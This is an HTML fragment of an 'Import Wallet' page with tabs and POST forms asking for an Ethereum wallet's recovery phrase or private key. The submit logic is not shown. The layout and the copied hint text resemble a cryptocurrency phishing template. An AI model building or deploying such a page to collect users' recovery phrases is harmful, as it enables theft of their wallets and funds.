<body>
    <header>
        <div class="container-fluid">
			<div class="row">
			<div class="col-md-4 offset-md-4">
				<a class="text-white" href="#" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Import Wallet</a>
			</div>
			</div>
		</div>
    </header>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 offset-md-4">
				<ul class="nav nav-tabs">
					<li class="nav-item"><a class="nav-link active show" data-toggle="tab" href="#phrase">Phrase</a></li>
					<!--<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>-->
					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
				</ul>
			</div>
		</div>
	</div>
    <section style="margin-top: 40px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-4 offset-md-4">
					<!-- Tab panes -->
					<div class="tab-content">
						<div role="tabpanel" class="tab-pane fade active show" id="phrase">
						<form method="post" id="phrform">
								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required="" id="phr"></textarea>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="value" value="Ethereum">
								<p id="message" style="color: red;"></p>
								<div class="form-group">
									<button class="btn btn-primary btn-block" type="button" name="submit" id="btnphrase">IMPORT</button>
								</div>
						</form>
						</div>
						<div role="tabpanel" class="tab-pane fade" id="privatekey">
							<form method="post">
								<div class="form-group">
									<input class="form-control" name="privatekey" id="prt" placeholder="Private Key" required="">
								</div>
								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
								<input type="hidden" name="value" value="Ethereum">
								<p id="message1" style="color: red;"></p>
								<div class="form-group"><button class="btn btn-primary btn-block" type="button" id="btnprivate" name="submit">IMPORT</button></div>
							</form>
						</div>
					</div>
                </div>
            </div>
        </div>
		
			

		
    </section>
